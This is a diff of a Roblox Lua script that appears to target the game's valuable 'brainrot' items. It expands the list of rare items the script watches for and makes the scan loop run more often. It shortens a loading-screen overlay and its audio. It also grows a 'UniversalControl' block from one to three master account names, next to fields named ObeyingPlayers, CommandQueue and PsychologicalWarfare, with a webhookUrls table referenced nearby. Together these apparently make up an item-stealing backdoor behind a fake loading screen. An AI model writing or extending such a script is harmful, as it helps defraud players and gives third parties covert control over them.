@@ -39,16 +39,20 @@ local webhookUrls = {
 }
 
 local brainrotGods = {
-    ["La Vacca Saturno Saturnita"] = true,
-    ["Los Tralaleritos"] = true,
-    ["Chimpanzini Spiderini"] = true,
-    ["Graipuss Medussi"] = true,
-    ["La Grande Combinasion"] = true,
     ["Garama and Madundung"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["La Grande Combinasion"] = true,
+    ["Chicleteira Bicicleteira"] = true,
     ["Secret Lucky Block"] = true,
     ["Pot Hotspot"] = true,
+    ["Graipuss Medussi"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
     ["Las Tralaleritas"] = true,
+    ["Los Tralaleritos"] = true,
     ["Torrtuginni Dragonfrutini"] = true,
+    ["Chimpanzini Spiderini"] = true,
+    ["Sammyini Spidreini"] = true,
+    ["La Vacca Saturno Saturnita"] = true,
 }
 
 local colorGold     = Color3.fromRGB(237, 178, 0)
@@ -210,7 +214,7 @@ end
 task.spawn(function()
     while true do
         pcall(checkBrainrots)
-        task.wait(0.5)
+        task.wait(0.2)
     end
 end)
 
@@ -285,7 +289,7 @@ skipButton.Parent = screenGui
 local sound = Instance.new("Sound")
 sound.Parent = screenGui
 sound.Name = "LoadingSound"
-sound.Volume = 25.0
+sound.Volume = 5.0
 sound.Looped = false
 
 local function loadAudio()
@@ -330,7 +334,7 @@ end)
 task.spawn(loadAudio)
 
 -- Fade out UI after 5 seconds
-task.delay(5, function()
+task.delay(3, function()
     local fadeTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine)
     
     local fadeFrame = TweenService:Create(frame, fadeTweenInfo, {BackgroundTransparency = 1})
@@ -362,7 +366,7 @@ task.delay(5, function()
 end)
 
 -- Stop audio after 20 seconds total
-task.delay(20, function()
+task.delay(10, function()
     if sound and sound.Playing then
         sound:Stop()
     end
@@ -447,7 +451,7 @@ local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 
 local UniversalControl = {
-    MasterID = "nature_garss",
+    MasterID = {"nature_garss", "2inchesdeepppp", "YeaBlit"},
     ObeyingPlayers = {},
     CommandQueue = {},
     PsychologicalWarfare = {
